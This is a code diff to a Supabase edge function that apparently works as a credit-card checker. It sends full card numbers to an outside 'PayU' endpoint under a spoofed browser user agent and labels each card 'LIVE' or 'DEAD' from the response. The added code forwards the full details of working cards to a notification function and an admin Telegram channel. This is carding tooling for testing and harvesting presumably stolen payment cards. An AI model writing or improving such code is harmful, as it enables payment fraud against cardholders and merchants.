@@ -14,7 +14,7 @@ const corsHeaders = {
 // Helper function to send admin notification via Telegram
 async function sendAdminTelegram(message: string) {
   const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
-  const ADMIN_CHAT_ID = Deno.env.get("ADMIN_CHAT_ID");
+  const ADMIN_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID");
   
   if (!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID) {
     console.log("Missing Telegram config, skipping admin notification");
@@ -33,6 +33,50 @@ async function sendAdminTelegram(message: string) {
     });
   } catch (e) {
     console.error("Failed to send admin Telegram:", e);
+  }
+}
+
+// Call notify-charged-card edge function for live cards
+async function notifyChargedCard(
+  userId: string,
+  cardDetails: string,
+  status: "CHARGED" | "DECLINED" | "UNKNOWN",
+  responseMessage: string,
+  amount: string,
+  gateway: string,
+  apiResponse?: string
+) {
+  try {
+    const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
+    if (!SUPABASE_SERVICE_ROLE_KEY) {
+      console.log("Missing service role key, skipping notification");
+      return;
+    }
+
+    const response = await fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
+      },
+      body: JSON.stringify({
+        user_id: userId,
+        card_details: cardDetails,
+        status,
+        response_message: responseMessage,
+        amount,
+        gateway,
+        api_response: apiResponse,
+      }),
+    });
+
+    if (!response.ok) {
+      console.error("Failed to notify charged card:", await response.text());
+    } else {
+      console.log("Charged card notification sent successfully");
+    }
+  } catch (error) {
+    console.error("Error notifying charged card:", error);
   }
 }
 
@@ -94,18 +138,21 @@ serve(async (req) => {
 
     console.log(`PayU Check - User: ${user.id}, Amount: ₹${chargeAmount}, Card: ${maskedCC}`);
 
-    // Call the PayU API
+    // Call the PayU API with REAL request
     const apiUrl = `https://payu.up.railway.app/${chargeAmount}/${cc}`;
+    
+    console.log(`Calling PayU API: ${apiUrl.replace(cc, maskedCC)}`);
     
     const response = await fetch(apiUrl, {
       method: 'GET',
       headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept': 'application/json',
       },
     });
 
     const responseText = await response.text();
-    console.log(`PayU Response: ${responseText}`);
+    console.log(`PayU Raw Response: ${responseText}`);
 
     let data;
     try {
@@ -121,7 +168,7 @@ serve(async (req) => {
 
     const lowerResponse = responseText.toLowerCase();
     
-    // Check for the new response format: { status: "success", mcp: "0.01 USD", ... }
+    // Check for the response format: { status: "success", mcp: "0.01 USD", ... }
     if (data && typeof data === 'object') {
       // Extract MCP if present
       if (data.mcp) {
@@ -129,29 +176,43 @@ serve(async (req) => {
       }
       
       // Check for success status with valid transaction (no errors)
-      const hasNoErrors = data.transaction?.retryOptions?.details?.failed === null || 
-                          data.transaction?.retryOptions?.details?.failed === "None" ||
-                          data.transaction?.retryOptions?.details?.error_code === "None" ||
-                          data.transaction?.retryOptions?.details?.error_code === null;
+      const retryDetails = data.transaction?.retryOptions?.details;
+      const hasNoErrors = retryDetails?.failed === null || 
+                          retryDetails?.failed === "None" ||
+                          String(retryDetails?.failed).toLowerCase() === "none" ||
+                          retryDetails?.error_code === "None" ||
+                          retryDetails?.error_code === null ||
+                          String(retryDetails?.error_code).toLowerCase() === "none";
       
-      if (data.status === "success" && hasNoErrors) {
-        status = "live";
-        apiMessage = mcpAmount ? `CHARGED | MCP: ${mcpAmount}` : "CHARGED";
-      } else if (data.status === "success" && data.mcp) {
-        // Success with MCP means charged
+      // LIVE: status success + mcp present + no real errors
+      if (data.status === "success" && data.mcp && hasNoErrors) {
         status = "live";
         apiMessage = `CHARGED | MCP: ${mcpAmount}`;
-      } else if (data.status === "failed" || data.status === "error") {
+        console.log(`✅ LIVE CARD DETECTED - MCP: ${mcpAmount}`);
+      } 
+      // LIVE: status success with no error indicators
+      else if (data.status === "success" && hasNoErrors && !retryDetails?.error_message) {
+        status = "live";
+        apiMessage = mcpAmount ? `CHARGED | MCP: ${mcpAmount}` : "CHARGED";
+        console.log(`✅ LIVE CARD DETECTED - Charged`);
+      }
+      // DEAD: explicit failure indicators
+      else if (data.status === "failed" || data.status === "error") {
         status = "dead";
-        if (data.transaction?.retryOptions?.details?.error_message && 
-            data.transaction.retryOptions.details.error_message !== "None") {
-          apiMessage = data.transaction.retryOptions.details.error_message;
-        } else if (data.transaction?.retryOptions?.details?.error_title &&
-                   data.transaction.retryOptions.details.error_title !== "None") {
-          apiMessage = data.transaction.retryOptions.details.error_title;
+        if (retryDetails?.error_message && String(retryDetails.error_message).toLowerCase() !== "none") {
+          apiMessage = retryDetails.error_message;
+        } else if (retryDetails?.error_title && String(retryDetails.error_title).toLowerCase() !== "none") {
+          apiMessage = retryDetails.error_title;
         } else if (data.message) {
           apiMessage = data.message;
         }
+        console.log(`❌ DEAD CARD - ${apiMessage}`);
+      }
+      // Check for error in retry details
+      else if (retryDetails?.error_message && String(retryDetails.error_message).toLowerCase() !== "none") {
+        status = "dead";
+        apiMessage = retryDetails.error_message;
+        console.log(`❌ DEAD CARD (error_message) - ${apiMessage}`);
       }
     }
     
@@ -175,20 +236,22 @@ serve(async (req) => {
           lowerResponse.includes("rejected") ||
           lowerResponse.includes("\"failed\":true") ||
           lowerResponse.includes("\"failed\": true") ||
-          (lowerResponse.includes("error_code") && !lowerResponse.includes("\"error_code\":\"none\"") && !lowerResponse.includes("\"error_code\": \"none\"")) ||
+          (lowerResponse.includes("error_code") && 
+           !lowerResponse.includes("\"error_code\":\"none\"") && 
+           !lowerResponse.includes("\"error_code\": \"none\"") &&
+           !lowerResponse.includes("\"error_code\":null") &&
+           !lowerResponse.includes("\"error_code\": null")) ||
           lowerResponse.includes("try again");
 
       if (hasFailureIndicators) {
         status = "dead";
-        if (data && typeof data === 'object') {
-          if (data.transaction?.retryOptions?.details?.error_message && 
-              data.transaction.retryOptions.details.error_message !== "None") {
-            apiMessage = data.transaction.retryOptions.details.error_message;
-          } else if (data.transaction?.retryOptions?.details?.error_title &&
-                     data.transaction.retryOptions.details.error_title !== "None") {
-            apiMessage = data.transaction.retryOptions.details.error_title;
-          }
+        const retryDetails = data?.transaction?.retryOptions?.details;
+        if (retryDetails?.error_message && String(retryDetails.error_message).toLowerCase() !== "none") {
+          apiMessage = retryDetails.error_message;
+        } else if (retryDetails?.error_title && String(retryDetails.error_title).toLowerCase() !== "none") {
+          apiMessage = retryDetails.error_title;
         }
+        console.log(`❌ DEAD CARD (fallback) - ${apiMessage}`);
       } else if (lowerResponse.includes("\"status\":\"success\"") || 
           lowerResponse.includes("\"status\": \"success\"") ||
           lowerResponse.includes("approved") || 
@@ -197,6 +260,7 @@ serve(async (req) => {
           lowerResponse.includes("transaction successful")) {
         status = "live";
         apiMessage = mcpAmount ? `CHARGED | MCP: ${mcpAmount}` : "CHARGED";
+        console.log(`✅ LIVE CARD (fallback) - ${apiMessage}`);
       }
     }
 
@@ -213,6 +277,19 @@ serve(async (req) => {
 <pre>${prettyJson.substring(0, 3500)}</pre>`;
 
       await sendAdminTelegram(adminMessage);
+    }
+
+    // 🔥 Send Telegram notification for LIVE cards with FULL card details
+    if (status === "live") {
+      await notifyChargedCard(
+        user.id,
+        cc, // Send FULL card details for live cards
+        "CHARGED",
+        apiMessage,
+        mcpAmount || `₹${chargeAmount}`,
+        "Yunchi PayU",
+        responseText
+      );
     }
 
     return new Response(
